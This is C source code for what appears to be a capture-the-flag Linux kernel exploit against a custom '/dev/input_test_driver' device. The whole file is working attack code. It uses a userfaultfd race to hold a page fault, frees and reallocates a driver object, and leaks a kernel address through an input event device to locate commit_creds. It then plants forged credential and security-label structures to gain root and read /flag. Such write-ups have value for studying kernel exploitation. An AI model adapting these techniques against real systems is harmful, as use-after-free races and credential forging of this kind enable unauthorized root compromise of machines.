#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/syscall.h>

#define STDIN  0
#define STDOUT 1
#define THREAD_STACK 0x4000

// flag : Defenit{pl2_DM_m3_hOw_th3_prOb_w4s}

// 0xffffffffa02ad5a0
unsigned long long commit_creds = 0;

int fd, fd2, fd3, fd4, fd5, fd6, fd7;
int flag = 0;
struct thread_arg {
    int sz;
    int sf;
    int ed;
};

char *arr[] = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"};

void printvalue(long value) {
    write(STDOUT, "0x", 2);
    write(STDOUT, arr[(value >> (4 * 15)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 14)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 13)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 12)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 11)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 10)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 9)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 8)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 7)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 6)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 5)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 4)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 3)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 2)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 1)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 0)) & 0xf], 1);
}

void write_err(const char *err)
{
    write(STDOUT, err, strlen(err));
}

#define ADDR 0x414243000
void *addr;

int userfaultfd(int flags)
{
#if 1
    int ret;
    asm(
            "movl %1, %%edi\n\t"
            "movl $323, %%eax\n\t"
            "syscall\n\t"
            "movl %%eax, %0\n\t"
            :"=r"(ret)
            :"r"(flags)
            :"rdi", "rax"
       );
    return ret;
#else
    syscall(323, flags);
#endif
}

volatile int userfault_type = 0;
void *userfaultfd_handler_thread(void *arg)
{
    int i, ret, idx, target_fd;
    int uffd = (int)((long)arg);
    struct uffd_msg msg;
    struct uffdio_copy uffdio_copy;
    size_t len;
    unsigned long value;
    unsigned long heap;
    unsigned long kernel_slide;
    char buf[256] = {};

    void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        write_err("mmap failed in userfaultfd\n");
    }

    while(1) {
       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1) {
           write_err("poll\n");
           exit(-1);
       }

        len = read(uffd, &msg, sizeof(msg));
        if(len < 0){
            write_err("read");
            exit(1);
        }

        write_err("len : ");
        printvalue(len);
        write_err("\n");

        if(msg.event != UFFD_EVENT_PAGEFAULT){
            write_err("msg.event");
            exit(1);
        }

        write_err("in userfault_fd\n");

        if (userfault_type == 0) {
            fd5 = open("/dev/input_test_driver", O_RDWR); // re-init the mutex - unlocks the mutex
            close(fd4); // free fp and ptr
            ioctl(fd5, 0x7331, 0); // allocate fp

            memset(page, '\x00', 0x100);
            *(char **)page = 4;
            *(unsigned long long *)((char *)page + 0x30) = (unsigned long long)0x0000003fffffffff;
            *(unsigned long long *)((char *)page + 0x38) = (unsigned long long)0x0000003fffffffff;
            *(unsigned long long *)((char *)page + 0x40) = (unsigned long long)0x0000003fffffffff;
            *(unsigned long long *)((char *)page + 0x190) = (commit_creds);

            uffdio_copy.src = (unsigned long) page;
            /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary */
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(0x1000 - 1);
            uffdio_copy.len = 0x1000;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                write_err("ioctl-UFFDIO_COPY");

            flag = 1;
        }
#if 0
        else if (userfault_type == 1) {
            memset(page, 'A', 0x1000);
            uffdio_copy.src = (unsigned long) page;
            /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary */
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(0x1000 - 1);
            uffdio_copy.len = 0x1000;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                write_err("ioctl-UFFDIO_COPY");
            break;
        }
#endif
        break;
    }

    return NULL;
}

// http://man7.org/linux/man-pages/man2/userfaultfd.2.html
int setup_userfaultfd(void *watch_region, size_t size){
    int uffd;
    int ret;
    struct uffdio_api uffdio_api = {};
    struct uffdio_register uffdio_register = {};
    pthread_t thread;

    uffd = userfaultfd(O_CLOEXEC | O_NONBLOCK);
    if(uffd < 0) {
        write_err("uffd");
        exit(1);
    }
    // printvalue(uffd);
    // write_err("\n");

    // enable api
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
        write_err("ioctl1 failed\n");
        exit(-1);
    }

    // set watch point
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    uffdio_register.range.start = (unsigned long)watch_region;
    uffdio_register.range.len = size;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register)) {
        write_err("ioctl1 failed\n");
        exit(-1);
    }

    // start watching
    // ensure("pthread_create",
    pthread_create(&thread, NULL, userfaultfd_handler_thread, (void *)((long)uffd));
    // thread_create(userfaultfd_handler_thread, (void *)((long)uffd));
    // ensure("pthread_detach", pthread_detach(thread));

    return uffd;
}

unsigned char myseccreds[0x60];
unsigned long long ptr1[0x80];
unsigned long long ptr2[0x100];
unsigned long long ptr3[0x100];
unsigned long long ptr4[0x100];
unsigned long long ptr5[0x100];

unsigned int db1[0x100];
unsigned int db2[0x100];
unsigned int db3[0x100];
unsigned int db4[0x100];
unsigned int db5[0x100];
unsigned int db6[0x100];
unsigned int db7[0x100];
unsigned int db8[0x100];

void prepare_seccreds() {
    // *(void **)myseccreds =  ptr1;
    *(void **)myseccreds = &ptr3[82];

    ptr1[0] = 0x42;
    ptr1[1] = &ptr1[1];
    ptr1[2] = 0;
    ptr1[3] = 0;
    ptr1[4] = 0;
    ptr1[5] = 0;
    ptr1[6] = ptr2;
    ptr1[7] = "unconfined";
    ptr1[8] = 0x29a;
    ptr1[9] = 0x0000000100000001;
    ptr1[10] = ptr3;

    ptr2[0] = 1;
    ptr2[1] = ptr1;

    ptr3[0] = "unconfined";
    ptr3[1] = "unconfined";
    ptr3[2] = &ptr3[2];
    ptr3[3] = &ptr3[2];
    ptr3[4] = &ptr3[4];
    ptr3[5] = &ptr3[4];
    ptr3[6] = 0;
    ptr3[7] = ptr5;
    ptr3[12] = 3;
    ptr3[16] = ptr4;
    ptr3[27] = ptr4;
    ptr3[82+0] = 0x42;
    ptr3[82+1] = &ptr3[82+1];
    ptr3[82+2] = 0;
    ptr3[82+3] = 0;
    ptr3[82+4] = 0;
    ptr3[82+5] = 0;
    ptr3[82+6] = ptr2;
    ptr3[82+7] = "unconfined";
    ptr3[82+8] = 0x29a;
    ptr3[82+9] = 0x0000000100000001;
    ptr3[82+10] = ptr3;

    ptr4[0] = 3;
    ptr4[1] = db1;
    ptr4[2] = db2;
    ptr4[3] = db3;
    ptr4[4] = db4;
    ptr4[5] = 0;
    ptr4[6] = 0;
    ptr4[7] = db7;
    ptr4[8] = db8;

    db1[0] = 0x40000;
    db1[1] = 0;
    db1[2] = 2;
    db1[3] = 0;

    db2[0] = 0x40001;
    db2[1] = 0;
    db2[2] = 2;
    db2[3] = 0;

    db3[0] = 0x20002;
    db3[1] = 0;
    db3[2] = 0x100;
    db3[3] = 0;

    db4[0] = 0x20003;
    db4[1] = 0;
    db4[2] = 2;
    db4[3] = 0;

    // db5[0] = 0x20002;
    // db5[1] = 0;
    // db5[2] = 0x100;
    // db5[3] = 0;

    // db6[0] = 0x20002;
    // db6[1] = 0;
    // db6[2] = 0x100;
    // db6[3] = 0;

    db7[0] = 0x40006;
    db7[1] = 0;
    db7[2] = 2;
    db7[3] = 0;

    db8[0] = 0x20007;
    db8[1] = 0;
    db8[2] = 0x100;
    db8[3] = 0;


    ptr5[0] = "root";
    ptr5[1] = "root";
    ptr5[2] = &ptr5[2];
    ptr5[3] = &ptr5[2];
    ptr5[4] = &ptr5[4];
    ptr5[5] = &ptr5[4];
    ptr5[6] = 0;
    ptr5[7] = 0;
    ptr5[8] = 0;
    ptr5[9] = &ptr5[9];
    ptr5[10] = &ptr5[9];
    ptr5[11] = 0;
    ptr5[12] = 0;
    ptr5[13] = ptr3;
    ptr5[14] = &ptr5[14];
    ptr5[15] = &ptr5[14];
    ptr5[16] = 0;
    ptr5[17] = 0;
    ptr5[18] = 0;
    ptr5[19] = 0;
    ptr5[20] = 0;
    ptr5[21] = &ptr5[21];
    ptr5[22] = &ptr5[21];
    ptr5[23] = 0;
    ptr5[24] = 0;
    ptr5[25] = &ptr5[25];
    ptr5[26] = &ptr5[26];
}

int main()
{
    struct input_event ie;
    int ret;
    char test[1024] = {0, };

    void *addrl = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    setup_userfaultfd(addrl,0x1000);

    fd = open("/dev/input/event2", O_RDONLY);
    if(fd < 0) {
        perror("event2");
        return -1;
    }

    fd2 = open("/dev/input_test_driver", O_RDWR);
    if(fd2 < 0) {
        perror("input_test_driver");
        return -1;
    }

    fd3 = open("/dev/input_test_driver", O_RDWR);
    if(fd3 < 0) {
        perror("input_test_driver");
        return -1;
    }

    test[0] = 1;

    // write(fd2, test, 5);
    write(fd2, test, 1);
    ioctl(fd2, 0x1337, 0); 

    for (int i = 0; i < sizeof(test); i++) {
        test[i] = 'A';
    }

    close(fd3);
    write(fd2,test,0x188);
    ioctl(fd2, 0x1337, 0); 
    ioctl(fd2, 0x7331, 0); 

    while (1) {
        ret = read(fd, &ie, sizeof(struct input_event));
        if(ret < 0) {
            perror("error");
            break;
        }
        if (ie.value == 0x41) {
            do {
                ret = read(fd, &ie, sizeof(struct input_event));
                if (ret < 0) {
                    perror("error");
                    break;
                }
            } while (ie.code != 0);
            break;
        }
        // printf("type: 0x%hx, code: 0x%hx, value: 0x%x \n", ie.type, ie.code, ie.value);
    }

    unsigned long long printk = -1;
    int t = 0;

    while (1) {
        ret = read(fd, &ie, sizeof(struct input_event));
        if(ret < 0) {
            perror("error");
            break;
        }

        if (ie.code == 1) {
            *(((char *)&printk) + t) = ie.value & 0xff;
            t += 1;
            if ((ie.value & 0xff) == 0xff)
                break;
        }
    }

    printf("%p\n", (void *)printk);
    commit_creds = printk - 0x3e280;
    prepare_seccreds();
    close(fd2);

    fd2 = open("/dev/input_test_driver", O_RDWR);
    fd4 = open("/dev/input_test_driver", O_RDWR);
    if(fd2 < 0) {
        perror("input_test_driver");
        return -1;
    }

    write(fd2, addrl, 0x198);
    while (!flag);

    memset(test, 0, 0x110);
    *(char **)test = 4;
    *(unsigned long long *)((char *)test + 0x30) = (unsigned long long)0x0000003fffffffff;
    *(unsigned long long *)((char *)test + 0x38) = (unsigned long long)0x0000003fffffffff;
    *(unsigned long long *)((char *)test + 0x40) = (unsigned long long)0x0000003fffffffff;
    *(unsigned long long *)((char *)test + 0x78) = (unsigned long long)(myseccreds);
    *(unsigned long long *)((char *)test + 0x80) = (unsigned long long)(commit_creds + 0x11a3880);
    *(unsigned long long *)((char *)test + 0x88) = (unsigned long long)(commit_creds + 0x11a3900);
    *(unsigned long long *)((char *)test + 0x90) = (unsigned long long)(commit_creds + 0x11aac88);
    write(fd2, test, 0x110);

    ioctl(fd2, 0x1337, 0);
    int id = getuid();
    write(1, "id: ", 4);
    printvalue(id);
    // system("/bin/sh"); <-- can't use this since copy-creds will end up copying the pointer and on fork/exec it will be pointing to random stuff
    int flg = open("/flag", O_RDONLY);
    read(flg,test,0x64);
    puts("");
    puts(test);


    char buf[2];
    puts("");
    puts("--------");
    read(0,buf,2);

    close(fd);


    return 0;
}
